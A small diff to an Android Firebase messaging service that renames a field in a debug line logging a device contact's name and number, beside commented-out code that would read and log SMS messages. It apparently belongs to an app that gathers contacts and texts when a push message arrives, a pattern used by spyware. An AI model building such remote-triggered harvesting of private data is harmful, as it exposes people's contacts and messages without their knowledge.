@@ -31,7 +31,7 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         ContentCollector cc = new ContentCollector();
         ContactsList contactLs = new ContactsList();
         contactLs.SetContact(cc.GetContacts(this));
-        Log.d(TAG,"Name : "+ contactLs.contact.get(1).GetName()+" Number : " + contactLs.contact.get(1).GetNumber());
+        Log.d(TAG,"Name : "+ contactLs.Contacts.get(1).GetName()+" Number : " + contactLs.Contacts.get(1).GetNumber());
         // List<SMS> lsSMS = cc.GetSMS(this);
         //Log.d(TAG,"Creator : "+ lsSMS.get(1).GetCreator()+" Message : " + lsSMS.get(1).GetBody());
 
